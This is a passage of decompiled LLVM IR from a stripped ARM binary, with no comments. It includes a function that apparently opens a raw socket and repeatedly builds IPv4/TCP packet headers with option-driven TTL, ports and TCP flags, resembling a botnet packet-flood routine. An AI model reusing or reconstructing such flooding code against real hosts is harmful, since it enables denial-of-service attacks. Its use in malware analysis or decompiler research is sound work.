  store i32 %v0_c118, i32* %v3_c124, align 4
  br i1 %v2_c120, label %dec_label_pc_bfb4, label %dec_label_pc_c12c

dec_label_pc_c12c:                                ; preds = %dec_label_pc_bfa8, %dec_label_pc_c118
  %v0_c12c = load i32, i32* @r5, align 4
  %v1_c12c = add i32 %v0_c12c, 40
  store i32 %v1_c12c, i32* %r0.global-to-local, align 4
  store i32 %v6_bc28, i32* %r1.global-to-local, align 4
  %v2_c134 = inttoptr i32 %v1_c12c to i16*
  %v3_c134 = call i32 @function_e9dc(i16* %v2_c134, i32 %v6_bc28)
  store i32 %v3_c134, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bfb4

dec_label_pc_c13c:                                ; preds = %dec_label_pc_bc88
  store i32 %v3_bc78, i32* %r0.global-to-local, align 4
  %v1_c140 = call i32 @function_10608(i32 %v3_bc78)
  store i32 %v1_c140, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c144

dec_label_pc_c144:                                ; preds = %dec_label_pc_ba78, %dec_label_pc_c13c
  %v1_c14c = phi i32 [ %v3_bc78, %dec_label_pc_ba78 ], [ %v1_c140, %dec_label_pc_c13c ]
  store i32 %v18_ba78, i32* %sb.global-to-local, align 4
  store i32 %v24_ba78, i32* %fp.global-to-local, align 4
  store i32 %v27_ba78, i32* %lr.global-to-local, align 4
  ret i32 %v1_c14c

dec_label_pc_c150:                                ; preds = %dec_label_pc_bcb0
  store i32 %v6_bc28, i32* %r0.global-to-local, align 4
  %v1_c158 = add i32 %v6_bc28, 20
  store i32 %v1_c158, i32* %sb.global-to-local, align 4
  %v3_c15c = mul i32 %v6_bc28, 65536
  store i32 %v3_c15c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_bf0c

; uselistorder directives
  uselistorder i32 %v0_c0f0, { 1, 0 }
  uselistorder i32 %v0_c0dc, { 1, 0 }
  uselistorder i32 %v0_c0c8, { 1, 0 }
  uselistorder i32 %v5_c09c, { 1, 0 }
  uselistorder i32 %v3_c04c, { 2, 1, 3, 0 }
  uselistorder i32 %v1_c028, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_bff4, { 1, 0 }
  uselistorder i32 %v4_bfe4, { 1, 0 }
  uselistorder i1 %v7_bf5c, { 2, 1, 0 }
  uselistorder i1 %v2_c120, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c0bc, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_bef0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bec4, { 1, 0 }
  uselistorder i32 %v1_bd78, { 1, 2, 0 }
  uselistorder i32 %v1_bd74, { 2, 1, 0 }
  uselistorder i32 %v1_bd70, { 2, 0, 1 }
  uselistorder i32 %v1_bd6c, { 2, 0, 1 }
  uselistorder i32 %v1_bd68, { 2, 0, 1 }
  uselistorder i32 %v1_bd40, { 1, 0 }
  uselistorder i32 %v3_bce8, { 1, 0 }
  uselistorder i32 %v3_bcc0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bcb8, { 1, 0, 2 }
  uselistorder i32 %v0_bcb4, { 1, 0, 2 }
  uselistorder i32 %v0_bcb0, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bca8, { 1, 0 }
  uselistorder i1 %v7_bc7c, { 1, 0 }
  uselistorder i32 %v3_bc78, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_bc64, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_bc50, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_bc28, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_bb80, { 3, 2, 1, 0 }
  uselistorder i32 %v5_bb64, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_bb14, { 1, 0 }
  uselistorder i32 %v2_ba94, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 37, 36, 39, 38, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 27, 23, 24, 25, 26, 31, 28, 29, 30, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c144, { 1, 0 }
  uselistorder label %dec_label_pc_c12c, { 1, 0 }
  uselistorder label %dec_label_pc_bfb4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bf30, { 1, 0 }
  uselistorder label %dec_label_pc_bf20, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c170(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c170:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c170 = load i32, i32* @r4, align 4
  %v24_c170 = load i32, i32* @fp, align 4
  %v27_c170 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_c18c = call i32 @function_11958(i32 %arg1, i32 4)
  %v0_c190 = load i32, i32* @r5, align 4
  store i32 %v0_c190, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c18c, i32* @sb, align 4
  %v0_c1a0 = load i32, i32* @r4, align 4
  store i32 %v0_c1a0, i32* %r0.global-to-local, align 4
  %v4_c1a4 = inttoptr i32 %v0_c190 to i32*
  %v5_c1a4 = call i32 @function_a300(i32 %v0_c1a0, i32* %v4_c1a4, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c1bc = load i32, i32* @r5, align 4
  store i32 %v0_c1bc, i32* %r1.global-to-local, align 4
  %v0_c1c0 = load i32, i32* @r4, align 4
  store i32 %v0_c1c0, i32* %r0.global-to-local, align 4
  %v5_c1c4 = trunc i32 %v5_c1a4 to i8
  %v6_c1c8 = inttoptr i32 %v0_c1bc to i32*
  %v7_c1c8 = call i32 @function_a300(i32 %v0_c1c0, i32* %v6_c1c8, i32 3, i32 65535)
  %v0_c1cc = load i32, i32* @r5, align 4
  store i32 %v0_c1cc, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c1dc = load i32, i32* @r4, align 4
  store i32 %v0_c1dc, i32* %r0.global-to-local, align 4
  %v5_c1e0 = inttoptr i32 %v0_c1cc to i32*
  %v6_c1e0 = call i32 @function_a300(i32 %v0_c1dc, i32* %v5_c1e0, i32 4, i32 64)
  %v1_c1e8 = urem i32 %v6_c1e0, 256
  %v0_c1ec = load i32, i32* @r5, align 4
  store i32 %v0_c1ec, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c1f8 = load i32, i32* @r4, align 4
  store i32 %v0_c1f8, i32* %r0.global-to-local, align 4
  %v6_c200 = inttoptr i32 %v0_c1ec to i32*
  %v7_c200 = call i32 @function_a300(i32 %v0_c1f8, i32* %v6_c200, i32 5, i32 1)
  %v1_c20c = urem i32 %v7_c200, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c218 = load i32, i32* @r5, align 4
  store i32 %v0_c218, i32* %r1.global-to-local, align 4
  %v0_c21c = load i32, i32* @r4, align 4
  store i32 %v0_c21c, i32* %r0.global-to-local, align 4
  %v5_c224 = inttoptr i32 %v0_c218 to i32*
  %v6_c224 = call i32 @function_a300(i32 %v0_c21c, i32* %v5_c224, i32 6, i32 65535)
  %v0_c22c = load i32, i32* @r5, align 4
  store i32 %v0_c22c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c224, i32* %fp.global-to-local, align 4
  %v0_c23c = load i32, i32* @r4, align 4
  store i32 %v0_c23c, i32* %r0.global-to-local, align 4
  %v4_c240 = inttoptr i32 %v0_c22c to i32*
  %v5_c240 = call i32 @function_a300(i32 %v0_c23c, i32* %v4_c240, i32 7, i32 65535)
  %v0_c248 = load i32, i32* @r5, align 4
  store i32 %v0_c248, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c240, i32* @r6, align 4
  %v0_c258 = load i32, i32* @r4, align 4
  store i32 %v0_c258, i32* %r0.global-to-local, align 4
  %v4_c25c = inttoptr i32 %v0_c248 to i32*
  %v5_c25c = call i32 @function_a300(i32 %v0_c258, i32* %v4_c25c, i32 17, i32 65535)
  %v0_c260 = load i32, i32* @r5, align 4
  store i32 %v0_c260, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c270 = load i32, i32* @r4, align 4
  store i32 %v0_c270, i32* %r0.global-to-local, align 4
  %v5_c274 = inttoptr i32 %v0_c260 to i32*
  %v6_c274 = call i32 @function_a300(i32 %v0_c270, i32* %v5_c274, i32 18, i32 0)
  %v0_c278 = load i32, i32* @r5, align 4
  store i32 %v0_c278, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c288 = load i32, i32* @r4, align 4
  store i32 %v0_c288, i32* %r0.global-to-local, align 4
  %v5_c28c = inttoptr i32 %v0_c278 to i32*
  %v6_c28c = call i32 @function_a300(i32 %v0_c288, i32* %v5_c28c, i32 11, i32 0)
  %v0_c290 = load i32, i32* @r5, align 4
  store i32 %v0_c290, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2a0 = load i32, i32* @r4, align 4
  store i32 %v0_c2a0, i32* %r0.global-to-local, align 4
  %v5_c2a4 = inttoptr i32 %v0_c290 to i32*
  %v6_c2a4 = call i32 @function_a300(i32 %v0_c2a0, i32* %v5_c2a4, i32 12, i32 0)
  %v0_c2a8 = load i32, i32* @r5, align 4
  store i32 %v0_c2a8, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2b8 = load i32, i32* @r4, align 4
  store i32 %v0_c2b8, i32* %r0.global-to-local, align 4
  %v5_c2bc = inttoptr i32 %v0_c2a8 to i32*
  %v6_c2bc = call i32 @function_a300(i32 %v0_c2b8, i32* %v5_c2bc, i32 13, i32 0)
  %v0_c2c0 = load i32, i32* @r5, align 4
  store i32 %v0_c2c0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2d0 = load i32, i32* @r4, align 4
  store i32 %v0_c2d0, i32* %r0.global-to-local, align 4
  %v5_c2d4 = inttoptr i32 %v0_c2c0 to i32*
  %v6_c2d4 = call i32 @function_a300(i32 %v0_c2d0, i32* %v5_c2d4, i32 14, i32 0)
  %v0_c2d8 = load i32, i32* @r5, align 4
  store i32 %v0_c2d8, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c2e8 = load i32, i32* @r4, align 4
  store i32 %v0_c2e8, i32* %r0.global-to-local, align 4
  %v5_c2ec = inttoptr i32 %v0_c2d8 to i32*
  %v6_c2ec = call i32 @function_a300(i32 %v0_c2e8, i32* %v5_c2ec, i32 15, i32 1)
  %v0_c2f0 = load i32, i32* @r5, align 4
  store i32 %v0_c2f0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c300 = load i32, i32* @r4, align 4
  store i32 %v0_c300, i32* %r0.global-to-local, align 4
  %v5_c304 = inttoptr i32 %v0_c2f0 to i32*
  %v6_c304 = call i32 @function_a300(i32 %v0_c300, i32* %v5_c304, i32 16, i32 0)
  %v2_c310 = load i32, i32* @global_var_20600.75, align 4
  store i32 %v2_c310, i32* %r3.global-to-local, align 4
  %v0_c314 = load i32, i32* @r5, align 4
  store i32 %v0_c314, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c31c = load i32, i32* @r4, align 4
  store i32 %v0_c31c, i32* %r0.global-to-local, align 4
  %v5_c320 = inttoptr i32 %v0_c314 to i32*
  %v6_c320 = call i32 @function_a294(i32 %v0_c31c, i32* %v5_c320, i32 25, i32 %v2_c310, i32 %v6_c304)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c334 = call i32 @function_10df0(i32 2, i32 3, i32 6)
  store i32 %v3_c334, i32* %r0.global-to-local, align 4
  %v7_c338 = icmp eq i32 %v3_c334, -1
  store i1 %v7_c338, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c334, i32* @sl, align 4
  br i1 %v7_c338, label %dec_label_pc_c80c, label %dec_label_pc_c344

dec_label_pc_c344:                                ; preds = %dec_label_pc_c170
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c34c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c34c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c360 = call i32 @function_10dac(i32 %v3_c334, i32 0, i32 3, i32 %v6_c34c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_c360, i32* %r0.global-to-local, align 4
  %v7_c364 = icmp eq i32 %v5_c360, -1
  store i1 %v7_c364, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c364, label %dec_label_pc_c804, label %dec_label_pc_c36c

dec_label_pc_c36c:                                ; preds = %dec_label_pc_c344
  %v3_c374 = mul i32 %v7_c1c8, 65536
  store i32 %v3_c374, i32* %r0.global-to-local, align 4
  %v0_c378 = load i32, i32* %fp.global-to-local, align 4
  %v3_c378 = mul i32 %v0_c378, 65536
  store i32 %v3_c378, i32* %r4.global-to-local, align 4
  %v0_c37c = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_c28c, i32* %r2.global-to-local, align 4
  %v3_c388 = urem i32 %v7_c1c8, 65536
  store i32 %v3_c388, i32* %r3.global-to-local, align 4
  %v3_c38c = urem i32 %v0_c378, 65536
  %v3_c390 = urem i32 %v0_c37c, 65536
  store i32 %v3_c390, i32* %r1.global-to-local, align 4
  %v0_c394 = load i32, i32* @r7, align 4
  %v2_c394 = icmp eq i32 %v0_c394, 0
  store i1 %v2_c394, i1* %cpsr_z.global-to-local, align 1
  %v1_c3a4 = urem i32 %v6_c28c, 256
  store i32 %v1_c3a4, i32* @fp, align 4
  br i1 %v2_c394, label %dec_label_pc_c5f8.preheader, label %dec_label_pc_c3ac

dec_label_pc_c3ac:                                ; preds = %dec_label_pc_c36c
  %tmp52 = mul i32 %v5_c25c, 256
  %v3_c3c4 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_c1c8, 256
  %v3_c3c8 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v5_c25c, 256
  %v4_c3d0 = urem i32 %tmp54, 256
  %v5_c3d0 = or i32 %v4_c3d0, %v3_c3c4
  store i32 %v5_c3d0, i32* @lr, align 4
  %v1_c3cc = mul i32 %v7_c1c8, 256
  %v4_c3d4 = and i32 %v1_c3cc, 65280
  %v5_c3d4 = or i32 %v4_c3d4, %v3_c3c8
  %tmp55 = mul i32 %v0_c378, 256
  %v3_c3e0 = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_c37c, 256
  %v3_c3e4 = and i32 %tmp56, 65280
  %v1_c3e8 = urem i32 %v6_c28c, 2
  %v1_c3ec = urem i32 %v6_c2a4, 2
  %tmp57 = udiv i32 %v0_c378, 256
  %v4_c3f0 = urem i32 %tmp57, 256
  %v5_c3f0 = or i32 %v4_c3f0, %v3_c3e0
  store i32 %v5_c3f0, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_c37c, 256
  %v4_c3f4 = urem i32 %tmp58, 256
  %v5_c3f4 = or i32 %v4_c3f4, %v3_c3e4
  store i32 %v5_c3f4, i32* @r5, align 4
  %v1_c410 = urem i32 %v6_c2bc, 2
  store i32 %v1_c410, i32* %r2.global-to-local, align 4
  %v1_c414 = urem i32 %v6_c2d4, 2
  store i32 %v1_c414, i32* %r3.global-to-local, align 4
  %v1_c418 = urem i32 %v6_c2ec, 2
  store i32 %v1_c418, i32* %r0.global-to-local, align 4
  %v1_c41c = urem i32 %v6_c304, 2
  store i32 %v1_c41c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext4 = mul nuw i32 %v5_c3d4, 65536
  %v4_c4a4 = sdiv i32 %sext4, 65536
  %tmp = sub nsw i32 0, %v1_c3ec
  %v4_c508 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_c410
  %v4_c51c = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_c414
  %v4_c534 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_c418
  %v3_c548 = and i32 %tmp64, 2
  %v1_c498 = trunc i32 %v6_c1e0 to i8
  br label %dec_label_pc_c43c

dec_label_pc_c43c:                                ; preds = %bb61, %dec_label_pc_c3ac
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c444 = call i32 @function_11958(i32 128, i32 1)
  store i32 %v2_c444, i32* %r0.global-to-local, align 4
  %v3_c448 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c448, i32* %r2.global-to-local, align 4
  %v1_c44c = load i32, i32* @sb, align 4
  %v2_c44c = load i32, i32* @r4, align 4
  %v5_c44c = mul i32 %v2_c44c, 4
  %v6_c44c = add i32 %v5_c44c, %v1_c44c
  %v7_c44c = inttoptr i32 %v6_c44c to i32*
  store i32 %v2_c444, i32* %v7_c44c, align 4
  %v0_c450 = load i32, i32* %r2.global-to-local, align 4
  %v3_c450 = mul i32 %v0_c450, 32
  store i32 %v3_c450, i32* %r3.global-to-local, align 4
  %v0_c454 = load i32, i32* @sb, align 4
  %v4_c454 = mul i32 %v0_c450, 4
  %v5_c454 = add i32 %v0_c454, %v4_c454
  %v6_c454 = inttoptr i32 %v5_c454 to i32*
  %v7_c454 = load i32, i32* %v6_c454, align 4
  store i32 %v7_c454, i32* %r4.global-to-local, align 4
  %v5_c458 = mul i32 %v0_c450, 24
  store i32 %v5_c458, i32* %r3.global-to-local, align 4
  %v1_c45c = load i32, i32* @r8, align 4
  %v2_c45c = add i32 %v1_c45c, %v5_c458
  store i32 %v2_c45c, i32* %r0.global-to-local, align 4
  %v1_c460 = inttoptr i32 %v7_c454 to i8*
  %v2_c460 = load i8, i8* %v1_c460, align 1
  %tmp65 = urem i8 %v2_c460, 16
  %v1_c464 = zext i8 %tmp65 to i32
  %v1_c468 = or i32 %v1_c464, 64
  store i32 %v1_c468, i32* %r3.global-to-local, align 4
  %v1_c46c = trunc i32 %v1_c468 to i8
  store i8 %v1_c46c, i8* %v1_c460, align 1
  %v0_c470 = load i32, i32* %r4.global-to-local, align 4
  %v1_c470 = inttoptr i32 %v0_c470 to i8*
  %v2_c470 = load i8, i8* %v1_c470, align 1
  %v1_c474 = and i8 %v2_c470, -16
  %v1_c478 = or i8 %v1_c474, 5
  store i32 %v1_c20c, i32* %r3.global-to-local, align 4
  store i8 %v1_c478, i8* %v1_c470, align 1
  %v2_c488 = load i32, i32* %r4.global-to-local, align 4
  %v3_c488 = add i32 %v2_c488, 1
  %v4_c488 = inttoptr i32 %v3_c488 to i8*
  store i8 %v5_c1c4, i8* %v4_c488, align 1
  store i32 %v1_c1e8, i32* %r2.global-to-local, align 4
  %v0_c490 = load i32, i32* %r3.global-to-local, align 4
  %v2_c490 = icmp eq i32 %v0_c490, 0
  store i1 %v2_c490, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_c498 = load i32, i32* %r4.global-to-local, align 4
  %v3_c498 = add i32 %v2_c498, 8
  %v4_c498 = inttoptr i32 %v3_c498 to i8*
  store i8 %v1_c498, i8* %v4_c498, align 1
  %v0_c49c = load i32, i32* %r3.global-to-local, align 4
  %v1_c49c = trunc i32 %v0_c49c to i16
  %v2_c49c = load i32, i32* %r4.global-to-local, align 4
  %v3_c49c = add i32 %v2_c49c, 2
  %v4_c49c = inttoptr i32 %v3_c49c to i16*
  store i16 %v1_c49c, i16* %v4_c49c, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_c4a4, i32* %r1.global-to-local, align 4
  %v0_c4a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c4a8, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_c43c
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_c43c, %bb
  %v2_c4ac = load i32, i32* %r4.global-to-local, align 4
  %v3_c4ac = add i32 %v2_c4ac, 9
  %v4_c4ac = inttoptr i32 %v3_c4ac to i8*
  store i8 6, i8* %v4_c4ac, align 1
  %v0_c4b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c4b0, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_c4b0 = load i32, i32* %r2.global-to-local, align 4
  %v2_c4b0 = trunc i32 %v1_c4b0 to i16
  %v3_c4b0 = load i32, i32* %r4.global-to-local, align 4
  %v4_c4b0 = add i32 %v3_c4b0, 6
  %v5_c4b0 = inttoptr i32 %v4_c4b0 to i16*
  store i16 %v2_c4b0, i16* %v5_c4b0, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_c320, i32* %r2.global-to-local, align 4
  %v1_c4b8 = load i32, i32* %r4.global-to-local, align 4
  %v2_c4b8 = add i32 %v1_c4b8, 12
  %v3_c4b8 = inttoptr i32 %v2_c4b8 to i32*
  store i32 %v6_c320, i32* %v3_c4b8, align 4
  %v0_c4bc = load i32, i32* %r0.global-to-local, align 4
  %v1_c4bc = add i32 %v0_c4bc, 16
  %v2_c4bc = inttoptr i32 %v1_c4bc to i32*
  %v3_c4bc = load i32, i32* %v2_c4bc, align 4
  store i32 %v3_c4bc, i32* %r3.global-to-local, align 4
  %v0_c4c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c4c0 = trunc i32 %v0_c4c0 to i16
  %v2_c4c0 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4c0 = add i32 %v2_c4c0, 4
  %v4_c4c0 = inttoptr i32 %v3_c4c0 to i16*
  store i16 %v1_c4c0, i16* %v4_c4c0, align 2
  %v0_c4c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_c4c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_c4c4 = add i32 %v1_c4c4, 16
  %v3_c4c4 = inttoptr i32 %v2_c4c4 to i32*
  store i32 %v0_c4c4, i32* %v3_c4c4, align 4
  %v0_c4c8 = load i32, i32* @r6, align 4
  %v1_c4c8 = trunc i32 %v0_c4c8 to i16
  %v2_c4c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4c8 = add i32 %v2_c4c8, 20
  %v4_c4c8 = inttoptr i32 %v3_c4c8 to i16*
  store i16 %v1_c4c8, i16* %v4_c4c8, align 2
  %v0_c4cc = load i32, i32* %r4.global-to-local, align 4
  %v1_c4cc = add i32 %v0_c4cc, 20
  store i32 %v1_c4cc, i32* %r1.global-to-local, align 4
  %v1_c4d0 = add i32 %v0_c4cc, 32
  %v2_c4d0 = inttoptr i32 %v1_c4d0 to i8*
  %v3_c4d0 = load i8, i8* %v2_c4d0, align 1
  %v4_c4d0 = zext i8 %v3_c4d0 to i32
  store i32 %v4_c4d0, i32* %r3.global-to-local, align 4
  %v1_c4d4 = add i32 %v0_c4cc, 33
  %v2_c4d4 = inttoptr i32 %v1_c4d4 to i8*
  %v3_c4d4 = load i8, i8* %v2_c4d4, align 1
  %v4_c4d4 = zext i8 %v3_c4d4 to i32
  store i32 %v1_c3e8, i32* %r0.global-to-local, align 4
  %v1_c4dc = urem i8 %v3_c4d0, 16
  %v1_c4e0 = or i8 %v1_c4dc, -96
  %v1_c4e4 = and i32 %v4_c4d4, 223
  store i32 %v1_c4e4, i32* %r2.global-to-local, align 4
  store i8 %v1_c4e0, i8* %v2_c4d0, align 1
  %v0_c4ec = load i32, i32* %r2.global-to-local, align 4
  %v1_c4ec = load i32, i32* %r0.global-to-local, align 4
  %v4_c4ec = mul i32 %v1_c4ec, 32
  %v5_c4ec = or i32 %v4_c4ec, %v0_c4ec
  store i32 %v5_c4ec, i32* %r2.global-to-local, align 4
  store i32 %v5_c3d0, i32* %r3.global-to-local, align 4
  %v1_c4f4 = trunc i32 %v5_c4ec to i8
  %v2_c4f4 = load i32, i32* %r1.global-to-local, align 4
  %v3_c4f4 = add i32 %v2_c4f4, 13
  %v4_c4f4 = inttoptr i32 %v3_c4f4 to i8*
  store i8 %v1_c4f4, i8* %v4_c4f4, align 1
  %v0_c4f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_c4f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_c4f8 = add i32 %v1_c4f8, 4
  %v3_c4f8 = inttoptr i32 %v2_c4f8 to i32*
  store i32 %v0_c4f8, i32* %v3_c4f8, align 4
  %v0_c4fc = load i32, i32* %r1.global-to-local, align 4
  %v1_c4fc = add i32 %v0_c4fc, 13
  %v2_c4fc = inttoptr i32 %v1_c4fc to i8*
  %v3_c4fc = load i8, i8* %v2_c4fc, align 1
  %v4_c4fc = zext i8 %v3_c4fc to i32
  store i32 %v1_c3ec, i32* %r0.global-to-local, align 4
  %v1_c504 = and i32 %v4_c4fc, 239
  %v5_c508 = or i32 %v1_c504, %v4_c508
  store i32 %v5_c508, i32* %r3.global-to-local, align 4
  %v1_c50c = trunc i32 %v5_c508 to i8
  store i8 %v1_c50c, i8* %v2_c4fc, align 1
  %v0_c510 = load i32, i32* %r1.global-to-local, align 4
  %v1_c510 = add i32 %v0_c510, 13
  %v2_c510 = inttoptr i32 %v1_c510 to i8*
  %v3_c510 = load i8, i8* %v2_c510, align 1
  %v4_c510 = zext i8 %v3_c510 to i32
  store i32 %v1_c410, i32* %r3.global-to-local, align 4
  %v1_c518 = and i32 %v4_c510, 247
  %v5_c51c = or i32 %v1_c518, %v4_c51c
  store i32 %v5_c51c, i32* %r2.global-to-local, align 4
  %v0_c520 = load i32, i32* @r5, align 4
  %v1_c520 = trunc i32 %v0_c520 to i16
  %v3_c520 = add i32 %v0_c510, 2
  %v4_c520 = inttoptr i32 %v3_c520 to i16*
  store i16 %v1_c520, i16* %v4_c520, align 2
  %v0_c524 = load i32, i32* %r2.global-to-local, align 4
  %v1_c524 = trunc i32 %v0_c524 to i8
  %v2_c524 = load i32, i32* %r1.global-to-local, align 4
  %v3_c524 = add i32 %v2_c524, 13
  %v4_c524 = inttoptr i32 %v3_c524 to i8*
  store i8 %v1_c524, i8* %v4_c524, align 1
  %v0_c528 = load i32, i32* %r1.global-to-local, align 4
  %v1_c528 = add i32 %v0_c528, 13
  %v2_c528 = inttoptr i32 %v1_c528 to i8*
  %v3_c528 = load i8, i8* %v2_c528, align 1
  %v4_c528 = zext i8 %v3_c528 to i32
  store i32 %v1_c414, i32* %r0.global-to-local, align 4
  %v1_c530 = and i32 %v4_c528, 251
  %v5_c534 = or i32 %v1_c530, %v4_c534
  store i32 %v5_c534, i32* %r3.global-to-local, align 4
  %v1_c538 = trunc i32 %v5_c534 to i8
  store i8 %v1_c538, i8* %v2_c528, align 1
